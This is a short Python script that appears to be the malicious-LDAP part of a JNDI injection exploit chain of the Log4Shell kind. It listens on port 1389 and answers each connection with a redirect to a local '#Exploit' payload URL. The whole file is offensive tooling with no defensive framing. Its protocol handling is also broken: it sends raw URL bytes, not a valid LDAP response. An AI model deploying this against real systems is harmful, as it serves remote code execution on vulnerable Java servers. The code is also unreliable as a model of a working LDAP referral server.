import socket
import threading

REDIRECT_URL = "http://localhost:8000/#Exploit"

def handle_client(client_socket):
    data = client_socket.recv(1024)
    print("[+] Received LDAP request")

    response = REDIRECT_URL.encode()

    client_socket.send(response)
    client_socket.close()
    print(f"[+] Sent redirect to {REDIRECT_URL}")

def start_ldap_server():
    bind_ip = "172.17.0.1"
    bind_port = 1389

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((bind_ip, bind_port))
    server.listen(5)
    print(f"[+] LDAP server listening on {bind_ip}:{bind_port}")

    while True:
        client, addr = server.accept()
        print(f"[+] Accepted connection from {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client,))
        client_handler.start()

if __name__ == "__main__":
    start_ldap_server()